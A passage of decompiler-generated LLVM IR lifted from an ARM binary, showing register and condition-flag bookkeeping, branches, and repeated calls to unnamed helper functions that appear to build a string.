  store i1 %v6_8828, i1* %cpsr_n.global-to-local, align 1
  %v7_8828 = icmp eq i8 %v3_881c, 7
  store i1 %v7_8828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8828, label %dec_label_pc_940c, label %dec_label_pc_8830

dec_label_pc_8830:                                ; preds = %dec_label_pc_8828
  %v2_8830 = icmp ugt i8 %v3_881c, 9
  store i1 %v2_8830, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8830 = icmp ult i8 %v3_881c, 10
  store i1 %v6_8830, i1* %cpsr_n.global-to-local, align 1
  %v7_8830 = icmp eq i8 %v3_881c, 10
  store i1 %v7_8830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8830, label %dec_label_pc_961c, label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_9510, %dec_label_pc_9950, %dec_label_pc_9a98, %dec_label_pc_9914, %dec_label_pc_8830, %dec_label_pc_87f4, %dec_label_pc_8858, %dec_label_pc_9d84, %dec_label_pc_9b34, %dec_label_pc_9a7c, %dec_label_pc_9934, %dec_label_pc_98fc, %dec_label_pc_9884, %dec_label_pc_9400, %dec_label_pc_88dc, %dec_label_pc_965c
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_8840 = add i32 %stack_var_-20832.0, 1
  store i32 %v1_8840, i32* %r2.global-to-local, align 4
  %v0_8844 = load i32, i32* @r8, align 4
  %v2_8848 = sub i32 %v1_8840, %v0_839c
  %v3_8848 = icmp uge i32 %v1_8840, %v0_839c
  store i1 %v3_8848, i1* %cpsr_c.global-to-local, align 1
  %v4_8848 = xor i32 %v1_8840, %v0_839c
  %v5_8848 = xor i32 %v2_8848, %v1_8840
  %v6_8848 = and i32 %v5_8848, %v4_8848
  %v7_8848 = icmp slt i32 %v6_8848, 0
  store i1 %v7_8848, i1* %cpsr_v.global-to-local, align 1
  %v8_8848 = icmp slt i32 %v2_8848, 0
  store i1 %v8_8848, i1* %cpsr_n.global-to-local, align 1
  %v9_8848 = icmp eq i32 %v1_8840, %v0_839c
  store i1 %v9_8848, i1* %cpsr_z.global-to-local, align 1
  %v1_8850 = add i32 %v0_8844, 3140
  store i32 %v1_8850, i32* @r8, align 4
  br i1 %v9_8848, label %dec_label_pc_8528, label %dec_label_pc_8858

dec_label_pc_8858:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e8
  %v0_8860 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_87e8 ], [ %v1_8850, %dec_label_pc_8838 ]
  %stack_var_-20832.0 = phi i32 [ %v1_87dc, %dec_label_pc_87e8 ], [ %v1_8840, %dec_label_pc_8838 ]
  %v1_8858 = add i32 %v0_8860, -1456
  %v2_8858 = inttoptr i32 %v1_8858 to i32*
  %v3_8858 = load i32, i32* %v2_8858, align 4
  store i32 %v3_8858, i32* %r0.global-to-local, align 4
  %v1_885c = add i32 %v3_8858, 1
  %v2_885c = icmp eq i32 %v3_8858, -1
  store i1 %v2_885c, i1* %cpsr_c.global-to-local, align 1
  %v3_885c = sub i32 0, %v3_8858
  %v4_885c = and i32 %v1_885c, %v3_885c
  %v5_885c = icmp slt i32 %v4_885c, 0
  store i1 %v5_885c, i1* %cpsr_v.global-to-local, align 1
  %v6_885c = icmp slt i32 %v1_885c, 0
  store i1 %v6_885c, i1* %cpsr_n.global-to-local, align 1
  %v7_885c = icmp eq i32 %v1_885c, 0
  store i1 %v7_885c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8858, i32* %sb.global-to-local, align 4
  br i1 %v7_885c, label %dec_label_pc_8838, label %dec_label_pc_8868

dec_label_pc_8868:                                ; preds = %dec_label_pc_8858
  %v3_8868 = udiv i32 %v3_8858, 32
  %v3_8870 = mul nuw nsw i32 %v3_8868, 4
  store i32 %v2_8748, i32* @lr, align 4
  %v2_8878 = add i32 %v3_8870, %v2_8748
  store i32 %v2_8878, i32* %r3.global-to-local, align 4
  %v1_887c = add i32 %v2_8878, -292
  %v2_887c = inttoptr i32 %v1_887c to i32*
  %v3_887c = load i32, i32* %v2_887c, align 4
  %v1_8880 = urem i32 %v3_8858, 32
  store i32 %v1_8880, i32* %r1.global-to-local, align 4
  %v2_8884 = add nsw i32 %v1_8880, -1
  %v3_8884 = shl i32 1, %v2_8884
  %v4_8884 = and i32 %v3_887c, %v3_8884
  %v5_8884 = icmp ne i32 %v4_8884, 0
  store i1 %v5_8884, i1* %cpsr_c.global-to-local, align 1
  %v6_8884 = lshr i32 %v3_887c, %v1_8880
  store i32 %v6_8884, i32* %r2.global-to-local, align 4
  %v1_8888 = urem i32 %v6_8884, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_8888 = icmp eq i32 %v1_8888, 0
  store i1 %v2_8888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8888, label %dec_label_pc_87f4, label %dec_label_pc_8890

dec_label_pc_8890:                                ; preds = %dec_label_pc_8868
  store i32 4, i32* @r4, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_88a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 4, i32* %stack_var_-48, align 4
  store i32 %v2_88b4, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v6_88c0 = call i32 @function_13e44(i32 %v3_8858, i32 1, i32 4, i32* nonnull %stack_var_-44, i32 %v2_88b4)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_88c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_88c8, i32* %r3.global-to-local, align 4
  %v2_88cc = or i32 %v3_88c8, %v6_88c0
  store i32 %v2_88cc, i32* %r0.global-to-local, align 4
  %v3_88cc = icmp slt i32 %v2_88cc, 0
  store i1 %v3_88cc, i1* %cpsr_n.global-to-local, align 1
  %v4_88cc = icmp eq i32 %v2_88cc, 0
  store i1 %v4_88cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_88cc, label %.thread38, label %dec_label_pc_88dc

.thread38:                                        ; preds = %dec_label_pc_8890
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, -1456
  %v3_88d0 = inttoptr i32 %v2_88d0 to i32*
  %v4_88d0 = load i32, i32* %v3_88d0, align 4
  store i32 %v4_88d0, i32* %r0.global-to-local, align 4
  %v1_88d4 = load i32, i32* @r4, align 4
  %v2_88d4 = trunc i32 %v1_88d4 to i8
  %v4_88d4 = add i32 %v1_88d0, -1452
  %v5_88d4 = inttoptr i32 %v4_88d4 to i8*
  store i8 %v2_88d4, i8* %v5_88d4, align 1
  %v0_88d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88d8.pr.pr, label %.thread38.dec_label_pc_87f4_crit_edge, label %dec_label_pc_88dc

.thread38.dec_label_pc_87f4_crit_edge:            ; preds = %.thread38
  %v0_87f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87f4

dec_label_pc_88dc:                                ; preds = %dec_label_pc_8890, %.thread38
  %v0_88dc = load i32, i32* @r8, align 4
  %v1_88dc = add i32 %v0_88dc, -1456
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  %v3_88dc = load i32, i32* %v2_88dc, align 4
  store i32 %v3_88dc, i32* %r0.global-to-local, align 4
  %v1_88e0 = call i32 @function_1369c(i32 %v3_88dc)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_88e8 = load i32, i32* @r8, align 4
  %v2_88e8 = add i32 %v1_88e8, -1456
  %v3_88e8 = inttoptr i32 %v2_88e8 to i32*
  store i32 -1, i32* %v3_88e8, align 4
  %v0_88ec = load i32, i32* @r5, align 4
  %v1_88ec = trunc i32 %v0_88ec to i8
  %v2_88ec = load i32, i32* @r8, align 4
  %v3_88ec = add i32 %v2_88ec, -1452
  %v4_88ec = inttoptr i32 %v3_88ec to i8*
  store i8 %v1_88ec, i8* %v4_88ec, align 1
  br label %dec_label_pc_8838

dec_label_pc_88f4:                                ; preds = %dec_label_pc_8650
  %v1_88f4 = add i32 %v3_8900, 25
  %v2_88f4 = inttoptr i32 %v1_88f4 to i32*
  %v3_88f4 = load i32, i32* %v2_88f4, align 4
  store i32 %v3_88f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_88f8 = icmp slt i32 %v3_88f4, 0
  store i1 %v1_88f8, i1* %cpsr_n.global-to-local, align 1
  %v2_88f8 = icmp eq i32 %v3_88f4, 0
  store i1 %v2_88f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_88f8, label %.thread43, label %.thread41

.thread41:                                        ; preds = %dec_label_pc_88f4
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_8650, align 1
  %v0_8904.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8904.pr.pr, label %.thread41..thread43_crit_edge, label %dec_label_pc_890c

.thread41..thread43_crit_edge:                    ; preds = %.thread41
  %v1_8904.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_8904.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_8904.pre to i8
  br label %.thread43

.thread43:                                        ; preds = %.thread41..thread43_crit_edge, %dec_label_pc_88f4
  %v3_8904 = phi i32 [ %v3_8904.pre, %.thread41..thread43_crit_edge ], [ %v3_8900, %dec_label_pc_88f4 ]
  %v1_8904.off0 = phi i8 [ %extract.t, %.thread41..thread43_crit_edge ], [ 0, %dec_label_pc_88f4 ]
  %v4_8904 = add i32 %v3_8904, -1427
  %v5_8904 = inttoptr i32 %v4_8904 to i8*
  store i8 %v1_8904.off0, i8* %v5_8904, align 1
  %v0_8908.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8908.pr, label %.thread43.dec_label_pc_8664_crit_edge, label %dec_label_pc_890c

.thread43.dec_label_pc_8664_crit_edge:            ; preds = %.thread43
  %v0_8664.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8664

dec_label_pc_890c:                                ; preds = %.thread41, %.thread43, %dec_label_pc_85c0
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_8914 = load i32, i32* @r7, align 4
  %v1_8914 = add i32 %v0_8914, 2112
  store i32 %v1_8914, i32* %r0.global-to-local, align 4
  %v1_8918 = load i32, i32* @r6, align 4
  %v2_8918 = add i32 %v1_8918, 33
  %v3_8918 = inttoptr i32 %v2_8918 to i32*
  store i32 -1, i32* %v3_8918, align 4
  %v0_891c = load i32, i32* %r0.global-to-local, align 4
  %v1_891c = add i32 %v0_891c, 4
  store i32 %v1_891c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_8924 = load i32, i32* @r5, align 4
  %v1_8924 = load i32, i32* @r6, align 4
  %v2_8924 = add i32 %v1_8924, 21
  %v3_8924 = inttoptr i32 %v2_8924 to i32*
  store i32 %v0_8924, i32* %v3_8924, align 4
  %v2_8928 = call i32 @function_12d7c(i32 %v1_891c, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_8934 = load i32, i32* @r5, align 4
  %v1_8934 = load i32, i32* @r6, align 4
  %v2_8934 = add i32 %v1_8934, 681
  %v3_8934 = inttoptr i32 %v2_8934 to i32*
  store i32 %v0_8934, i32* %v3_8934, align 4
  %v2_8938 = call i32 @function_12d7c(i32 %stack_var_-20856.0.ph, i32 10240)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8940 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  %v0_8948 = load i32, i32* @r6, align 4
  store i32 %v0_8948, i32* %r1.global-to-local, align 4
  %v2_894c = add i32 %v2_8940, %stack_var_-20856.0.ph
  store i32 %v2_894c, i32* @r0, align 4
  %v2_8950 = inttoptr i32 %v2_894c to i8*
  %v3_8950 = call i32 @function_12d04(i8* %v2_8950, i32 %v0_8948)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8958 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f54.28 to i32), i32* %r1.global-to-local, align 4
  %v2_8964 = add i32 %v2_8958, %stack_var_-20856.0.ph
  store i32 %v2_8964, i32* @r0, align 4
  %v2_8968 = inttoptr i32 %v2_8964 to i8*
  %v3_8968 = call i32 @function_12d04(i8* %v2_8968, i32 ptrtoint (i32* @global_var_15f54.28 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8970 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  %v0_8978 = load i32, i32* @r7, align 4
  %v1_8978 = add i32 %v0_8978, 532
  store i32 %v1_8978, i32* %r1.global-to-local, align 4
  %v2_897c = add i32 %v2_8970, %stack_var_-20856.0.ph
  store i32 %v2_897c, i32* @r0, align 4
  %v2_8980 = inttoptr i32 %v2_897c to i8*
  %v3_8980 = call i32 @function_12d04(i8* %v2_8980, i32 %v1_8978)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8988 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_15f2c.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8994 = add i32 %v2_8988, %stack_var_-20856.0.ph
  store i32 %v2_8994, i32* @r0, align 4
  %v3_8998 = inttoptr i32 %v2_8994 to i8*
  %v4_8998 = call i32 @function_12d04(i8* %v3_8998, i32 ptrtoint ([24 x i8]* @global_var_15f2c.30 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89a0 = call i32 @function_12cdc(i8* %v1_8940)
  %v2_89a8 = add i32 %v2_89a0, %stack_var_-20856.0.ph
  store i32 %v2_89a8, i32* @r0, align 4
  %v0_89ac = load i32, i32* @r7, align 4
  %v1_89ac = add i32 %v0_89ac, 20
  store i32 %v1_89ac, i32* %r1.global-to-local, align 4
  %v2_89b0 = inttoptr i32 %v2_89a8 to i8*
  %v3_89b0 = call i32 @function_12d04(i8* %v2_89b0, i32 %v1_89ac)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89b8 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15f44.32 to i32), i32* %r1.global-to-local, align 4
  %v2_89c4 = add i32 %v2_89b8, %stack_var_-20856.0.ph
  store i32 %v2_89c4, i32* @r0, align 4
  %v3_89c8 = inttoptr i32 %v2_89c4 to i8*
  %v4_89c8 = call i32 @function_12d04(i8* %v3_89c8, i32 ptrtoint ([9 x i8]* @global_var_15f44.32 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89d0 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v0_89d8 = load i32, i32* @r7, align 4
  %v2_89dc = add i32 %v2_89d0, %stack_var_-20856.0.ph
  store i32 %v2_89dc, i32* @r0, align 4
  %v1_89e0 = add i32 %v0_89d8, 789
  store i32 %v1_89e0, i32* %r1.global-to-local, align 4
  %v2_89e4 = inttoptr i32 %v2_89dc to i8*
  %v3_89e4 = call i32 @function_12d04(i8* %v2_89e4, i32 %v1_89e0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89ec = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  %v2_89f8 = add i32 %v2_89ec, %stack_var_-20856.0.ph
  store i32 %v2_89f8, i32* @r0, align 4
  %v3_89fc = inttoptr i32 %v2_89f8 to i8*
  %v4_89fc = call i32 @function_12d04(i8* %v3_89fc, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_8a04 = call i32 @function_123b0(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a0c = call i32 @function_12cdc(i8* %v1_8940)
  %v0_8a10 = load i32, i32* @r5, align 4
  store i32 %v0_8a10, i32* %r1.global-to-local, align 4
  store i32 %v2_8a0c, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_8a1c = inttoptr i32 %v0_8a10 to i32*
  %v3_8a1c = call i32 @function_122cc(i32 32, i32* %v2_8a1c)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 %v3_8a1c, i32* %r1.global-to-local, align 4
  %v1_8a28 = load i32, i32* @r4, align 4
  %v2_8a28 = add i32 %v1_8a28, %stack_var_-20856.0.ph
  store i32 %v2_8a28, i32* @r0, align 4
  %v2_8a2c = inttoptr i32 %v2_8a28 to i8*
  %v3_8a2c = call i32 @function_12d04(i8* %v2_8a2c, i32 %v3_8a1c)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_8a34 = call i32 @function_122f8(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a3c = call i32 @function_12cdc(i8* %v1_8940)
  %v2_8a44 = add i32 %v2_8a3c, %stack_var_-20856.0.ph
  store i32 %v2_8a44, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  %v3_8a4c = inttoptr i32 %v2_8a44 to i8*
  %v4_8a4c = call i32 @function_12d04(i8* %v3_8a4c, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a54 = call i32 @function_123b0(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a5c = call i32 @function_12cdc(i8* %v1_8940)
  %v0_8a60 = load i32, i32* @r5, align 4
  store i32 %v0_8a60, i32* %r1.global-to-local, align 4
  store i32 %v2_8a5c, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_8a6c = inttoptr i32 %v0_8a60 to i32*
  %v3_8a6c = call i32 @function_122cc(i32 33, i32* %v2_8a6c)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a6c, i32* %r1.global-to-local, align 4
  %v1_8a78 = load i32, i32* @r4, align 4
  %v2_8a78 = add i32 %v1_8a78, %stack_var_-20856.0.ph
  store i32 %v2_8a78, i32* @r0, align 4
  %v2_8a7c = inttoptr i32 %v2_8a78 to i8*
  %v3_8a7c = call i32 @function_12d04(i8* %v2_8a7c, i32 %v3_8a6c)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a84 = call i32 @function_122f8(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a8c = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8a98 = add i32 %v2_8a8c, %stack_var_-20856.0.ph
  store i32 %v2_8a98, i32* @r0, align 4
  %v3_8a9c = inttoptr i32 %v2_8a98 to i8*
  %v4_8a9c = call i32 @function_12d04(i8* %v3_8a9c, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8aa4 = call i32 @function_123b0(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8aac = call i32 @function_12cdc(i8* %v1_8940)
  %v0_8ab0 = load i32, i32* @r5, align 4
  store i32 %v0_8ab0, i32* %r1.global-to-local, align 4
  store i32 %v2_8aac, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_8abc = inttoptr i32 %v0_8ab0 to i32*
  %v3_8abc = call i32 @function_122cc(i32 34, i32* %v2_8abc)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8abc, i32* %r1.global-to-local, align 4
  %v1_8ac8 = load i32, i32* @r4, align 4
  %v2_8ac8 = add i32 %v1_8ac8, %stack_var_-20856.0.ph
  store i32 %v2_8ac8, i32* @r0, align 4
  %v2_8acc = inttoptr i32 %v2_8ac8 to i8*
  %v3_8acc = call i32 @function_12d04(i8* %v2_8acc, i32 %v3_8abc)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8ad4 = call i32 @function_122f8(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8adc = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8ae8 = add i32 %v2_8adc, %stack_var_-20856.0.ph
  store i32 %v2_8ae8, i32* @r0, align 4
  %v3_8aec = inttoptr i32 %v2_8ae8 to i8*
  %v4_8aec = call i32 @function_12d04(i8* %v3_8aec, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32))
  store i32 %v4_8aec, i32* %r0.global-to-local, align 4
  store i32 %v6_8200, i32* %r1.global-to-local, align 4
  %v1_8af4 = load i32, i32* @r5, align 4
  %v2_8af4 = sub i32 %v6_8200, %v1_8af4
  %v3_8af4 = icmp uge i32 %v6_8200, %v1_8af4
  store i1 %v3_8af4, i1* %cpsr_c.global-to-local, align 1
  %v4_8af4 = xor i32 %v1_8af4, %v6_8200
  %v5_8af4 = xor i32 %v2_8af4, %v6_8200
  %v6_8af4 = and i32 %v5_8af4, %v4_8af4
  %v7_8af4 = icmp slt i32 %v6_8af4, 0
  store i1 %v7_8af4, i1* %cpsr_v.global-to-local, align 1
  %v8_8af4 = icmp slt i32 %v2_8af4, 0
  store i1 %v8_8af4, i1* %cpsr_n.global-to-local, align 1
  %v9_8af4 = icmp eq i32 %v6_8200, %v1_8af4
  store i1 %v9_8af4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8af4, label %dec_label_pc_8bcc, label %dec_label_pc_8afc

dec_label_pc_8afc:                                ; preds = %dec_label_pc_890c
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8b00 = call i32 @function_123b0(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b08 = call i32 @function_12cdc(i8* %v1_8940)
  %v0_8b0c = load i32, i32* @r5, align 4
  store i32 %v0_8b0c, i32* %r1.global-to-local, align 4
  store i32 %v2_8b08, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_8b18 = inttoptr i32 %v0_8b0c to i32*
  %v3_8b18 = call i32 @function_122cc(i32 35, i32* %v2_8b18)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8b18, i32* %r1.global-to-local, align 4
  %v1_8b24 = load i32, i32* @r4, align 4
  %v2_8b24 = add i32 %v1_8b24, %stack_var_-20856.0.ph
  store i32 %v2_8b24, i32* @r0, align 4
  %v2_8b28 = inttoptr i32 %v2_8b24 to i8*
  %v3_8b28 = call i32 @function_12d04(i8* %v2_8b28, i32 %v3_8b18)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8b30 = call i32 @function_122f8(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b38 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8b44 = add i32 %v2_8b38, %stack_var_-20856.0.ph
  store i32 %v2_8b44, i32* @r0, align 4
  %v3_8b48 = inttoptr i32 %v2_8b44 to i8*
  %v4_8b48 = call i32 @function_12d04(i8* %v3_8b48, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b50 = call i32 @function_12cdc(i8* %v1_8940)
  %v0_8b54 = load i32, i32* @r5, align 4
  store i32 %v0_8b54, i32* %r1.global-to-local, align 4
  store i32 %v2_8b50, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8b60 = inttoptr i32 %v0_8b54 to i32*
  %v3_8b60 = call i32 @function_122cc(i32 40, i32* %v2_8b60)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8b60, i32* %r1.global-to-local, align 4
  %v2_8b6c = add i32 %v2_8b50, %stack_var_-20856.0.ph
  store i32 %v2_8b6c, i32* @r0, align 4
  %v2_8b70 = inttoptr i32 %v2_8b6c to i8*
  %v3_8b70 = call i32 @function_12d04(i8* %v2_8b70, i32 %v3_8b60)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b78 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_15f54.28 to i32), i32* %r1.global-to-local, align 4
  %v2_8b84 = add i32 %v2_8b78, %stack_var_-20856.0.ph
  store i32 %v2_8b84, i32* @r0, align 4
  %v2_8b88 = inttoptr i32 %v2_8b84 to i8*
  %v3_8b88 = call i32 @function_12d04(i8* %v2_8b88, i32 ptrtoint (i32* @global_var_15f54.28 to i32))
  store i32 %v6_8200, i32* %r0.global-to-local, align 4
  %v2_8b90 = call i32 @function_12cdc(i8* %v1_8b90)
  store i32 %v2_8b90, i32* @r4, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b9c = call i32 @function_12cdc(i8* %v1_8940)
  %v2_8ba4 = add i32 %v2_8b9c, %stack_var_-20856.0.ph
  store i32 %v2_8ba4, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v0_8bac = load i32, i32* @r4, align 4
  store i32 %v0_8bac, i32* %r0.global-to-local, align 4
  %v3_8bb0 = trunc i32 %v0_8bac to i8
  %v4_8bb0 = call i32 @function_131d0(i8 %v3_8bb0, i32 10, i32 %v2_8ba4)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bb8 = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8bc4 = add i32 %v2_8bb8, %stack_var_-20856.0.ph
  store i32 %v2_8bc4, i32* @r0, align 4
  %v3_8bc8 = inttoptr i32 %v2_8bc4 to i8*
  %v4_8bc8 = call i32 @function_12d04(i8* %v3_8bc8, i32 ptrtoint ([3 x i8]* @global_var_15f50.34 to i32))
  store i32 %v4_8bc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8bcc

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_890c, %dec_label_pc_8afc
  %v0_8bcc = load i32, i32* @r6, align 4
  %v1_8bcc = add i32 %v0_8bcc, 37
  %v2_8bcc = inttoptr i32 %v1_8bcc to i32*
  %v3_8bcc = load i32, i32* %v2_8bcc, align 4
  store i32 %v3_8bcc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8bd0 = icmp slt i32 %v3_8bcc, 0
  store i1 %v1_8bd0, i1* %cpsr_n.global-to-local, align 1
  %v2_8bd0 = icmp eq i32 %v3_8bcc, 0
  store i1 %v2_8bd0, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v3_8bcc, 1
  br i1 %tmp208, label %dec_label_pc_8c78, label %dec_label_pc_8bd8

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8bcc
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bdc = call i32 @function_12cdc(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15f64.36 to i32), i32* %r1.global-to-local, align 4
  %v2_8be8 = add i32 %v2_8bdc, %stack_var_-20856.0.ph
  store i32 %v2_8be8, i32* @r0, align 4
  %v3_8bec = inttoptr i32 %v2_8be8 to i8*
  %v4_8bec = call i32 @function_12d04(i8* %v3_8bec, i32 ptrtoint ([9 x i8]* @global_var_15f64.36 to i32))
  store i32 %v4_8bec, i32* %r0.global-to-local, align 4
  %v0_8bf0 = load i32, i32* @r6, align 4
  %v1_8bf0 = add i32 %v0_8bf0, 37
  %v2_8bf0 = inttoptr i32 %v1_8bf0 to i32*
  %v3_8bf0 = load i32, i32* %v2_8bf0, align 4
  store i32 %v3_8bf0, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
